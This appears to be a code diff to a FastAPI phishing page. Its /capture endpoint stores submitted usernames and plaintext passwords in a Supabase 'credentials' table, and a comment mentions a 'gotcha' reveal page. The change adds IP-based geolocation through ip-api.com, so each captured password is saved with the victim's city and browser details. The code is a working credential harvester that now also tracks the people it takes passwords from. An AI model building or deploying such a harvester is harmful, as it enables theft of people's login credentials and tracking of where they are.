@@ -3,6 +3,7 @@ from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse
 from fastapi.templating import Jinja2Templates
 from supabase import create_client
+import requests
 
 app = FastAPI()
 templates = Jinja2Templates(directory="templates")
@@ -24,11 +25,24 @@ async def get_index(request: Request):
     return templates.TemplateResponse(request=request, name="index.html")
 
 @app.post("/capture")
+    
 async def capture(request: Request, u: str = Form(...), p: str = Form(...)):
+    client_ip = request.headers.get("x-forwarded-for")
+    
+    city = "Unknown"
+    if client_ip:
+        # 2. Ask a Geo API about this IP
+        try:
+            # We take the first IP in the list (in case of multiple proxies)
+            actual_ip = client_ip.split(",")[0]
+            geo_response = requests.get(f"http://ip-api.com/json/{actual_ip}").json()
+            city = geo_response.get("city", "Unknown")
+        except:
+            pass
     user_info = request.headers.get('user-agent')
     
     # Save to Supabase
-    data = {"username": u, "password": p, "user_agent": user_info}
+    data = {"username": u, "password": p, "user_agent": user_info,"city": city}
     supabase.table("credentials").insert(data).execute()
 
     # The Reveal Page (The "Gotcha")
